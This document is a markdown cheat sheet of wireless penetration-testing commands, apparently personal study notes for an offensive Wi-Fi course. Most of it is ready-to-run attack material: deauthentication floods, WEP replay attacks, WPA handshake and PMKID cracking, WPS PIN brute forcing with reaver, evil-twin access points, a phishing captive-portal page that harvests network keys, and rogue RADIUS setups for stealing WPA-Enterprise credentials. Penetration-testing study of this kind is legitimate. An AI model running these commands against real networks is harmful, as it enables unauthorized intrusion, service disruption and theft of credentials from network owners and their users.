# üõ∞Ô∏è Offensive Security Wireless Pen-Testing Cheat Sheet

---

## A. Dependancies

Packages that are needed on the OS for success:

```bash
sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

## B. Hardware Prep

**Detailed info about attached USBs**

`sudo lsusb -vv`

The iw utility and its variety of options is the only command we need for configuring a Wi-Fi device.

`sudo iw list`

**The rfkill Utility**

`sudo rfkill block all` [Block every type of radio]

`sudo rfkill list`[list and kill by radio designation]

## üì° 1. Preparation

```bash
# Enable monitor mode
airmon-ng check kill
airmon-ng start wlan0

# OR using iw
ip link set wlan0 down
iw dev wlan0 set type monitor
ip link set wlan0 up
```

```bash
# Check interfaces
iwconfig
```

### WireShark

Wireshark filter

`wlan.fc.type == 2`

###### Remote Packet Capture

`ssh root@10.11.0.196 "sudo -S tcpdump -U -w - -i wlan0mon" | sudo wireshark -k -i -`

---

## üîç 2. Discovery & Reconnaissance

```bash
# Scan for APs and clients
airodump-ng wlan0mon
# or
airodump-ng wlan0
# Airmon-ng does not provide any confirmation that monitor mode has been
# started on the specified channel. Running iw shows that the monitor mode 
# interface is listening on the desired channel and frequency.
sudo iw dev wlan0mon info
sudo airmon-ng --verbose

# stoping monitor mode
sudo airmon-ng stop wlan0mon
```

### Airodump-ng

The options we will use most often are saving to a file, filtering
by BSSID, and capturing only on a specific channel.

| Option        | Description                                                 |
| ------------- | ----------------------------------------------------------- |
| -w prefix     | Saves the capture dump to the specified filename            |
| --bssid BSSID | Filters Airodump-ng to only capture the specified BSSID     |
| -c channel(s) | Forces Airodump-ng to only capture the specified channel(s) |

```bash
# Target specific BSSID and channel
airodump-ng -c <channel> --bssid <BSSID> -w capture wlan0mon

airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w 
./wireless_cap/testing_my_knowledge  
```

The table below contains descriptions of all of the Airodump-ng
fields in the top section, where APs are displayed.

| Field   | Description                                                                                                                                                                                                                                  |
| ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| BSSID   | The MAC address of the AP                                                                                                                                                                                                                    |
| PWR     | The signal level reported by the card, which will get higher as we get closer to the AP or station                                                                                                                                           |
| RXQ     | Receive Quality as measured by the percentage of frames successfully received over the last 10 seconds                                                                                                                                       |
| Beacons | Number of announcement frames sent by the AP                                                                                                                                                                                                 |
| # Data  | Number of captured data packets (if WEP, this is the unique IV count), including data broadcast packets                                                                                                                                      |
| #/s     | Number of data packets per second measured over the last 10 seconds                                                                                                                                                                          |
| CH      | Channel number taken from beacon frames. Note that sometimes frames from other channels are captured due to overlapping channels                                                                                                             |
| MB      | Maximum speed supported by the AP. 11=802.11b, 22=802.11b+, up to 54 is 802.11g and anything higher is 802.11n or 802.11ac                                                                                                                   |
| ENC     | Encryption algorithm in use. OPN=no encryption, "WEP?"=WEP or higher<br> (not enough data to choose between WEP and WPA/WPA2), WEP=static or <br>dynamic WEP, and WPA or WPA2 if TKIP or CCMP is present. WPA3 and OWE <br>both require CCMP |
| CIPHER  | The cipher detected: CCMP, WRAP, TKIP, WEP, WEP40, or WEP104                                                                                                                                                                                 |
| AUTH    | The authentication protocol used. One of MGT (WPA/WPA2/WPA3 <br>Enterprise), SKA (WEP shared key), PSK (WPA/WPA2/WPA3 pre shared key), <br>or OPN (WEP open authentication)                                                                  |
| ESSID   | The so-called SSID, which can be empty if the SSID is hidden                                                                                                                                                                                 |

### Airodump Output parameters

By default, executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of
formats:

- PCAP, with a cap extension.
- CSV, with a csv extension.
- Kismet legacy CSV, with a kismet.csv extension.
- Kismet legacy NetXML, with a kismet.netxml extension.
- Log CSV, with a log.csv extension.

Two additional files are created with certain options:

- GPS coordinates, with a gps extension when the -g option and a GPS device is configured. More details about this feature
  in a later section.
- Initialization Vector (IVS), with a .ivs extension with
  the --ivs option. In this case, only the IVS file will be
  created. This option is only useful for WEP cracking.

### Airodump Interactive mode

`space` == pause

`tab` == interactive mode

`arrow up` `arrow down` == scrolling

`A` == display options

`S` == sorting options

`I` == Invert sorting

`D` == Default sort

---

## üèπ 3. WEP Attacks [Aireplay-ng]

| Attack # | Attack Name                          |
| -------- | ------------------------------------ |
| 0        | Deauthentication                     |
| 1        | Fake Authentication                  |
| 2        | Interactive Packet Replay            |
| 3        | ARP Request Replay Attack            |
| 4        | KoreK ChopChop Attack                |
| 5        | Fragmentation Attack                 |
| 6        | CafeÃÅ-Latte Attack                   |
| 7        | Client-Oriented Fragmentation Attack |
| 8        | WPA Migration Mode Attack            |
| 9        | Injection Test                       |

```bash
# Fake auth [this is to make sure that you can talk with the AP prior to 
# your attack]
aireplay-ng -1 0 -a <BSSID> -h <Your_MAC> wlan0mon

#Deauth
aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0


# ARP replay attack
aireplay-ng -3 -b <BSSID> -h <Your_MAC> wlan0mon
```

| Option    | Description                             |
| --------- | --------------------------------------- |
| -x nbpps  | Number of packets per second            |
| -p fctrl  | Set frame control word (hex)            |
| -a bssid  | Access point MAC address                |
| -c dmac   | Destination MAC address                 |
| -h smac   | Source MAC address                      |
| -e essid  | Target AP SSID                          |
| -j        | arpreplay attack: inject FromDS packets |
| -g value  | Change ring buffer size (default: 8)    |
| -k IP     | Destination IP in fragments             |
| -l IP     | Source IP in fragments                  |
| -o npckts | Number of packets per burst (-1)        |
| -q sec    | Seconds between keep-alives (-1)        |
| -y prga   | Keystream for shared key authentication |
| -B        | Bit rate test                           |
| -D        | Disable AP detection                    |
| -F        | Chooses first matching packet           |
| -R        | Disables /dev/rtc usage                 |

---

## üîì 4. WPA/WPA2 Handshake Capture

While performing the WEP attack capture must be running. 

```bash
# Capture WPA handshake in pcap
airodump-ng -c <channel> --bssid <BSSID> -w handshake wlan0mon
airodump-ng wlan0 -c 6 --bssid 6E:89:D4:EC:34:37 -w ./wireless_cap/testing_my_knowledge  

# Deauth clients to force handshake [Note this is to target the AP]
aireplay-ng -0 10 -a <BSSID> wlan0mon

# Deauth clients to force handshake [Note this is to target the Devices connecting to the AP]
aireplay-ng -0 1 -a 6E:89:D4:EC:34:37 -c D6:58:91:1E:59:C5 wlan0
```

---

## üîë 5. Crack WPA/WPA2 (PSK)

```bash
# Aircrack with wordlist and John
aircrack-ng -w <wordlist.txt> -b <BSSID> handshake.cap

aircrack-ng -w /usr/share/john/password.lst -e wifu
-b 34:08:04:09:3D:38 wpa-01.cap
```

How to confirm that the password is correct:

`-b` == BSSID

`-e` == ESSID

`-p` == cracked password you want to confirm

example:

`airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap`

### Aircrack-ng and John

```bash
#John password file location
/usr/share/john/password.lst

#The JtR mangling rules are located
 /etc/john/john.conf

#Chaning JtR rules can be as simple as 
sudo nano /etc/john/john.conf
# Add two numbers to the end of each password
$[0-9]$[0-9]
$[0-9]$[0-9]$[0-9]

#have your new custom wordlist output for use with aircrack-ng
john --wordlist=/usr/share/john/password.lst --rules --stdout 
| aircrack-ng -e wifu -w - ~/wpa-01.cap
```

---

### Aircrack-ng troubleshooting

##### 1. **No Matching Handshake in the Capture File**

- If the `.cap` file doesn't contain a **complete 4-way WPA handshake**, `aircrack-ng` won‚Äôt be able to verify any password.

- Run this to verify:

- `aircrack-ng captureHorse.cap-01.cap`

##### **2. Password Is Not in the Generated Wordlist**

##### **3. Pipe May Be Too Fast (Race Condition)**

```bash
crunch 11 11 -t Juniper%%%^ -o wordlist.txt
aircrack-ng -w wordlist.txt -e Hodept-working-horse captureHorse.cap-01.cap
```

---

### Aircrack-ng and Crunch

```bash
Crunch also allows us to specify a pattern with the -t option with or
 without a character set. Different symbols in the pattern define the
 type of character to use.
Cruch requires only minimum length and maximum length of the password.

crunch _min_ _max_ options 
    @ represents lowercase characters or characters from a defined set
    , represents uppercase characters
    % represent numbers
    ^ represents symbols

#How to fill in for possible missing characters. 
crunch 11 11 -t password%%%
# or 
crunch 11 11 0123456789 -t password@@@

# The -p option generates unique words from a character set or a set of 
# whole words. 
crunch 1 1 -p dog cat bird
# this creates all of the different variations of bird, dog, and cat together
# as a single password

#you can combine generation and words by doing the following
crunch 5 5 -t ddd%% -p dog cat bird
crunch 5 5 aADE -t ddd@@ -p dog cat bird

#Now we can pipe the data from crunch into aircrack-ng
crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap 
-w -
```

### Aircrack-ng and rsmangler

```bash
# RSMangler can create a giant wordlist for password cracking 
# that can either be piped to other tools or saved to a file.

Steps:

1. create new wordlist file with individual words line seperated
2. point rsmangler to the file 

rsmangler --file wordlist.txt
rsmangler --file wordlist.txt --output mangled.txt [output the new RS file]

3. Using --min and --max options, we limit the length of the
   RSMangler words

4. Point RSmangler to aircrack-ng

rsmangler --file wordlist.txt --min 12 --max 13 
| aircrack-ng -e wifu rsmangler-01.cap -w -
```

------

### Checking your password aginst a pcap

```bash
airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap

airdecap-ng -b 76:5C:7F:17:C6:26 -e Hodept-working-horse -p Juniper5968265$ working-01.cap 
```

---

## ü¶ä 6. WPA/WPA2 PMKID Attack [Using Hashcat]

```bash
# Crack with hashcat
hashcat -m 2500 handshake.hccapx wordlist.txt

hashcat -m 2500 --deprecated-check-disable output.hccapx
 /usr/share/john/password.lst

hashcat -a 0 -m  22000  hash.hc22000 /usr/share/john/password.lst


# Convert .cap to .hccapx for hashcat
cap2hccapx handshake.cap handshake.hccapx
```

```bash
# Capture PMKID
hcxdumptool -i wlan0mon -o dump.pcapng --enable_status=1
hcxpcapngtool -o pmkid.16800 -E essidlist.txt dump.pcapng

# Crack with hashcat
hashcat -m 16800 pmkid.16800 wordlist.txt
```

---

## üß™ 7. WPS Attacks

The WPS process securely transmits the WPA or WPA2 passphrase over
wireless using EAP messages

```bash
# WPS scan
wash -i wlan0mon

# Reaver WPS attack
reaver -i wlan0mon -b <BSSID> -c <channel> -vv
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv

# Pixie Dust attack (if vulnerable)
reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv
sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -vv -K
```

```bash
Wash v1.6.6 WiFi Protected Setup Scan Tool
Copyright (c) 2011, Tactical Network Solutions, Craig Heffner

Required Arguments:
        -i, --interface=<iface>              Interface to capture packets on
        -f, --file [FILE1 FILE2 FILE3 ...]   Read packets from capture files

Optional Arguments:
        -c, --channel=<num>                  Channel to listen on [auto]
        -n, --probes=<num>                   Maximum number of probes to send to each AP in scan mode [15]
        -O, --output-file=<filename>         Write packets of interest into pcap file
        -F, --ignore-fcs                     Ignore frame checksum errors
        -2, --2ghz                           Use 2.4GHz 802.11 channels
        -5, --5ghz                           Use 5GHz 802.11 channels
        -s, --scan                           Use scan mode
        -u, --survey                         Use survey mode [default]
        -a, --all                            Show all APs, even those without WPS
        -j, --json                           print extended WPS info as json
        -U, --utf8                           Show UTF8 ESSID (does not sanitize ESSID, dangerous)
        -p, --progress                       Show percentage of crack progress
        -h, --help                           Show help

Example:
        wash -i wlan0mon
```

Using Known_Pins to try and assist when looking at a specific vendor

```bash
sudo apt install airgeddon
source /usr/share/airgeddon/known_pins.db

#knowing if there is a pin you are looking for try searching for part of
#the pin
echo ${PINDB["0013F7"]}

#then use this in reaver using steps for known pin 
```

#### üß† If You Know Half the PIN

Depending on **which half** you know, the strategy changes:

---

##### üîç Option 1: You Know the **First Half** (e.g., `1234xxxx`)

Reaver supports manually specifying the first half to **skip bruteforcing it**.

`reaver -i wlan0mon -b <BSSID> -c <channel> -p 1234 -vv`

- `-p 1234`: First half of PIN provided, Reaver will brute-force only the second half.

- MUCH faster than full brute-force.

- Reaver will still compute the checksum automatically.

##### üîç Option 2: You Know the **Second Half** (e.g., `xxxx5670`)

This is trickier ‚Äî Reaver **only supports fixing the first half** via `-p`.

But here's what you can do:

1. **Try combining** a fixed first half guess with your known second half (full 8-digit PIN).

2. Use the full PIN in `-p`:
   
   * `reaver -i wlan0mon -b <BSSID> -c <channel> -p 12345670 -vv`

3. If you know the **entire PIN** already (minus the checksum), you can calculate the checksum or try combinations.

4. To calculate the checksum:
   Python snippet:

5. ```python
   def wps_checksum(pin):
       accum = 0
       while pin:
           accum += 3 * (pin % 10)
           pin //= 10
           accum += pin % 10
           pin //= 10
       return (10 - accum % 10) % 10
   
   pin7 = 1234567
   checksum = wps_checksum(pin7)
   print(f"WPS PIN: {pin7}{checksum}")
   ```

‚ö° Speeding It Up with Pixie Dust

If the target is vulnerable to the **Pixie Dust attack** (static PIN generation), you can force Reaver to try Pixie:

`reaver -i wlan0mon -b <BSSID> -c <channel> -K 1 -vv`

---

## üì∂ 8. Rogue AP / Evil Twin

```bash
#First you need to gather information about the AP you wish to mimic 
#Data points such as 
    ESSID 
    BSSID of FC:7A:2B:88:63:EF
    WPA (TKIP/CCMP) and WPA2 (TKIP/CCMP)
    PSK
    channel 1
#Information such as this can be determined from a PCAP

#Ensure that the tool is installed 
sudo apt install hostapd-mana
```

```bash
#example Hostapd-mana config
kali@kali:~$ vi your-mana.conf
interface=wlan0
ssid=FluffyChicken
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/kali/FluffyChicken.hccapx
```

```bash
#capture your handshakes and crack them

#start hostapd with the correct config
sudo hostapd-mana your-mana.conf

#deauth as needed to deauth devices that are trying to connect to your mimiced AP name
sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon

#once you have handshakes use john to crack like you would normally
aircrack-ng FluffyChicken.hccapx -e Chicken -w /usr/share/john/password.lst
```

---

## üßº 9. Captive Portal Attacks

```bash
# capture handshake as previously done
sudo airodump-ng -w discovery --output-format pcap wlan0mon
sudo aireplay-ng -0 0 -a 00:0E:08:90:3A:5F wlan0mon

#install apache as needed
sudo apt install apache2 libapache2-mod-php

#use something as a base for your attack [wget and save locally]
wget -r -l2 https://www.abc123!@%^.com
```

Create captive portal for use as splash screen

location - index.php in /var/www/html/portal.

```html
<!DOCTYPE html>
<html lang="en">

    <head>
        <link href="assets/css/style.css" rel="stylesheet">
        <title>MegaCorp One - Nanotechnology Is the Future</title>
    </head>
    <body style="background-color:#000000;">
        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
            <div class="container">
                <div class="navbar-header">
                    <a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
                </div>
            </div>
        </div>

        <div id="headerwrap" class="old-bd">
            <div class="row centered">
                <div class="col-lg-8 col-lg-offset-2">
                    <?php
                        if (isset($_GET["success"])) {
                            echo '<h3>Login successful</h3>';
                            echo '<h3>You may close this page</h3>';
                        } else {
                            if (isset($_GET["failure"])) {
                                echo '<h3>Invalid network key, try again</h3><br/><br/>';
                            }
                    ?>
                <h3>Enter network key</h3><br/><br/>
                <form action="login_check.php" method="post">
                    <input type="password" id="passphrase" name="passphrase"><br/><br/>
                    <input type="submit" value="Connect"/>
                </form>
                <?php
                        }
                ?>
                </div>

                <div class="col-lg-4 col-lg-offset-4 himg ">
                    <i class="fa fa-cog" aria-hidden="true"></i>
                </div>
            </div>
        </div>

    </body>
</html>
```

---

# üîê WPA-Enterprise (802.1X / PEAP / MSCHAPv2) Crack Walkthrough

> **Objective**: Set up a rogue AP, force a client to connect, capture MSCHAPv2 hashes, and crack them.
> 
> The AUTH column shows the AP
> has an authentication type of **MGT**, meaning WPA Enterprise.

CMD to check cert timeouts. 

`openssl x509 -in CERT_FILENAME -noout -enddate`

---

Steps

1. Pcap to capture certificate

2. Deauth client 

3. open the capture file with *Wireshark* and locate the server certificate frame
   
   1. **tls.handshake.type == 11** or **tls.handshake.certificate**
   
   2. open *Extensible Authentication Protocol* > *Transport Layer Security*. We now have
      to open the **TLSv1 Record Layer: Handshake Protocol: Certificate** (or similar, as the TLS version will vary). Once there, we will
      have to expand **Handshake Protocol: Certificate** item, then **Certificates** (plural). Inside **Certificates**, we can see one or
      more entries named **Certificate**. Each of them will be preceded by
      the length. For each certificate, we right click and select *Export
      Packet Bytes* to save the data into a file with a .der extension
   
   3. Read each file and or Convert to a PEM file. 
      
      1. `openssl x509 -inform der -in CERTIFICATE_FILENAME-text`
      
      2. `openssl x509 -inform der -in CERTIFICATE_FILENAME -outform pem -out OUTPUT_PEM.crt`

4. Install radius server `sudo apt install freeradius`

5. As a root user, we'll need to navigate to /etc/freeradius/3.0/certs and change the settings of ca.cnf. We edit the **[certificate_authority]** fields to
   match our target CA certificate to appear less suspicious to clients
   in case they inspect the certificate.
   
   1. `cd /etc/freeradius/3.0/certs`
   
   2. `vi ./ca.cnf`
   
   3. now change server conf `vi server.cnf`

6. Now nuke the Diffie-Hellman
   
   1. `rm dh`
   
   2. `make`
      
      1. Ignore any client side errors as that conf file was not touched.

---

## üèóÔ∏è Step-by-Step: Using hostapd-wpe

### 1. Install hostapd-mana

```bash
apt install hostapd-mana
```

---

### 2. Configure hostapd-wpe

Edit the config (`/etc/hostapd-mana/mana.conf`):

```conf
interface=wlan0
ssid=CorpWiFi
channel=6
driver=nl80211
logger_stdout=-1
logger_stdout_level=2
ieee8021x=1
auth_server_addr=127.0.0.1
auth_server_port=1812
auth_server_shared_secret=secret
eap_server=1
eap_user_file=/etc/hostapd-wpe/hostapd.eap_user
```

---

### 3. Start Rogue AP

```bash
hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
```

Wait for a client to connect. You'll see captured **MSCHAPv2** challenge/response hashes in `/var/www/html/`.

---

### üì¶ Example Output

```text
USERNAME: alice
CHALLENGE: xxxxxxxxxxxxx
RESPONSE: yyyyyyyyyyyyy
```

---

### 4. Crack with asleap

```bash
asleap -C <CHALLENGE> -R <RESPONSE> -W wordlist.txt
```

Or use hashcat:

```bash
# Format for hashcat -m 5500 (MSCHAPv2)
<username>::<domain>:<challenge>:<response>:unused

# Run with hashcat
hashcat -m 5500 hash.txt wordlist.txt
```

---

## üõ† Alternative: Using Eaphammer

```bash
apt install eaphammer

# Simple rogue AP attack
eaphammer --interface wlan0 --essid CorpWiFi --creds

# With deauth
eaphammer --interface wlan0 --essid CorpWiFi --channel 6 --deauth --creds
```

Captured credentials appear in `/var/lib/eaphammer/`.

---

## üîê Cracking Captured Hashes with Hashcat

```bash
hashcat -m 5500 hash.txt rockyou.txt
hashcat -m 5500 hash.txt rockyou.txt --show
```

---

## üßº Cleanup

```bash
airmon-ng stop wlan0mon
service NetworkManager restart
```

---

## ‚ò†Ô∏è Notes

- WPA-Enterprise attacks don‚Äôt yield pre-shared keys like WPA2-PSK.
- These attacks rely on **social engineering + rogue APs**.
- Success depends on users connecting and entering credentials.
- Certificate warnings can tip off users.

---

# üîç Extras

### A. ¬†Bettercap

here are a several commands in the Wi-Fi module that will be useful
to us.

- **recon** Scan the 802.11 spectrum for APs and
  capture WPA/WPA2 handshakes.
- **deauth**:Deauthenticate clients from an AP.
- **show**:Display the discovered wireless stations.
- **ap**: Create a rogue AP.

example `wifi.recon on`

Using Tickers- 

```bash
wlan0  ¬ª set ticker.commands "clear; wifi.show"

wlan0  ¬ª wifi.recon on
...
wlan0  ¬ª ticker on

sudo bettercap -iface wlan0 -eval "set ticker.commands 
'clear; wifi.show'; wifi.recon on; ticker on"
```

Showing APs based off of a BSSID:

```bash
wlan0  ¬ª wifi.recon c6:2d:56:2a:53:f8

wlan0  ¬ª wifi.show
```

Deauth with Bettercap 

```bash
#with the use of a specific MAC address you have multiple options, you can
#deauth the AP, or you can focus on one specific client
wifi.deauth c6:2d:56:2a:53:f8
```

```bash
#Config file for Bettercap can be located and tailored 
wlan1  ¬ª wifi.recon off

 wlan1  ¬ª get wifi.handshakes.file 

  wifi.handshakes.file: '~/bettercap-wifi-handshakes.pcap'

 wlan0  ¬ª set wifi.handshakes.file "/home/kali/handshakes/"

 wlan0  ¬ª set wifi.handshakes.aggregate false

 wlan0  ¬ª wifi.recon on

 wlan0  ¬ª wifi.deauth c6:2d:56:2a:53:f8


#if there is a device that you wish not to deauth you can specify prior to attack
wlan0  ¬ª set wifi.deauth.skip ac:22:0b:28:fd:22

wlan0  ¬ª wifi.deauth c6:2d:56:2a:53:f8
```

Caplets

```bash
cat -n deauth_corp.cap 
 1  set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} ¬ª {reset}
 2
 3  set ticker.period 10
 4  set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8
 5
 6  events.ignore wifi.ap.new
 7  events.ignore wifi.client.probe
 8  events.ignore wifi.client.new
 9
10  wifi.recon on
11  ticker on
12  events.clear
13  clear

#start bettercap with caplet
sudo bettercap -iface wlan0 -caplet deauth_corp.cap
```

---

### B.  Kismet

File location `/etc/kismet`

- **kismet_80211.conf** configures settings related to Wi-Fi.

- **kismet_alerts.conf** configures Kismet's intrusion detection
  and alert subsystem. 

- **kismet.conf** is the master configuration file for Kismet.

- **kismet_filter.conf** configures filtering rules for devices and
  packets.

- **kismet_httpd.conf** configures Kismet's web server.

- **kismet_logging.conf** configures how and where Kismet creates
  log files.

- **kismet_memory.conf** configures Kismet's memory usage.

- **kismet_uav.conf** contains rules for detecting unmanned aerial
  vehicles (UAV) and drones.

---

### C. DNSMASQ

- dnsmasq is a DHCP and DNS server plugin

- Example config file 
  
  - ```bash
    # Main options
    # http://www.thekelleys.org.uk/dnsmasq/docs/dnsmasq-man.html
    domain-needed
    bogus-priv
    no-resolv
    filterwin2k
    expand-hosts
    domain=localdomain
    local=/localdomain/
    # Only listen on this address. When specifying an 
    # interface, it also listens on localhost.
    # We don't want to interrupt any local resolution
    listen-address=10.0.0.1
    
    # DHCP range
    dhcp-range=10.0.0.100,10.0.0.199,12h
    dhcp-lease-max=100
    # Router: wlan0
    dhcp-option=option:router,10.0.0.1
    dhcp-authoritative
    
    # DNS: Primary and secondary Google DNS
    server=8.8.8.8
    server=8.8.4.4
    ```

`sudo dnsmasq --conf-file=dnsmasq.conf`

---

### D. Non-Rouge AP setup

1. Create config file. 
   
   1. ```bash
      vi host-ap.conf
      
      interface=wlan0
      ssid=BTTF
      channel=11
      
      # 802.11n
      hw_mode=g
      ieee80211n=1
      
      # WPA2 PSK with CCMP
      wpa=2
      wpa_key_mgmt=WPA-PSK
      rsn_pairwise=CCMP
      wpa_passphrase=GreatScott
      ```

`sudo hostapd hostapd.conf`
